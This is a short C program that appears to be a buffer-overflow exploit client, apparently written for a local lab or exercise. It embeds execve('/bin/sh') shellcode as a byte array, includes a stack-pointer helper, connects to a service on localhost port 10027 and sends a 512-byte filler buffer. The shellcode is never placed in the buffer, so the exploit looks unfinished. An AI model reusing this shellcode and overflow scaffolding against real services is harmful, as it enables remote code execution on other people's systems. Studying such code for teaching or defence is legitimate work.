#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char** argv)
{
	int sockfd;
	int len;
	struct sockaddr_in address;
	int result;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = inet_addr("127.0.0.1");
	address.sin_port = htons(10027);
	len = sizeof(address);
	result = connect(sockfd, (struct sockaddr *)&address, len);
	int i;
	if(result == -1) {
		perror("oops: client");
		exit(1);
	}
	char buf[512];
	write(sockfd, "123", 4);
	read(sockfd, buf, sizeof buf);
	if (!strcmp(buf, "NO"))
	{
		printf("goodby\n");
		return 0;
	}
	for (i = 0; i < 512; i++)
		buf[i] = 1;
	write(sockfd, buf, 512);
	read(sockfd, buf, sizeof buf);
	printf("leaving...\n");
	close(sockfd);
	exit(0);
}

